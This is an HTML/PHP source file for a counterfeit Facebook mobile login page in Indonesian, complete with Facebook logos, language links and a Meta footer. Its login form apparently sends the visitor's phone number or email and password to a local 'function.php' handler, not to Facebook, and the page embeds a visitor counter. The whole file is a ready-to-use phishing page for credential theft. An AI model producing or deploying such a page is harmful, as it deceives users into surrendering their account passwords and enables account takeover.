<html>
<head>
    <title>facebook-login</title>
    <meta charset="utf-8" />
    <meta name="description" content="visitor" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="login.css" />
</head>
<body>
    <div class="notif">
        <img src="images/logofb.png" />
        <p>
            Pasang Facebook untuk Android dan buka lebih cepat.
        </p>
    </div>
    <div class="container">
        <div class="header">
            <img src="images/fb.png">
        </div>
        <div class="content">
            <div class="login">
                <form method="post" action="function.php" name="form">
                    <div class="username">
                        <input type="text" name="username" placeholder="Nomor ponsel atau email" required="" maxlength="25" />
                    </div>
                    <div class="password">
                        <input type="password" name="password" placeholder="Kata Sandi" required="" maxlength="25" />
                    </div>
                    <div class="submit">
                        <input type="submit" name="submit" value="Masuk" />
                    </div>
                    <div id="log">
                        <p>
                            Lupa kata sandi?
                        </p>
                    </div>
                </form>
                <div class="or">
                    <div id="hrleft">
                        <hr>
                    </div>
                    <p>
                        atau
                    </p>
                    <div id="hrright">
                        <hr>
                    </div>
                </div>
            </div>
            <div class="redirect">
                <a href="https://m.facebook.com/reg/?soft=hjk">
                    <div id="button">
                        <input type="button" name="button" value="Buat akun baru">
                    </div>
                </a>
            </div>
            <div class="artikel">
                <div class="artikelleft">
                    <p>
                        Bahasa Indonesia
                    </p>
                    <p>
                        Basa Jawa
                    </p>
                    <p>
                        日本語
                    </p>
                    <p>
                        Português (Brasil)
                    </p>
                </div>
                <div class="artikelright">
                    <p>
                        English (UK)
                    </p>
                    <p>
                        Bahasa Melayu
                    </p>
                    <p>
                        Español
                    </p>
                    <div id="box">
                        +
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <p>
                Meta &copy 2023
            </p>
        </p>
    </div>
    <?php
    include ("counter.php");
    ?>
</body>
</html>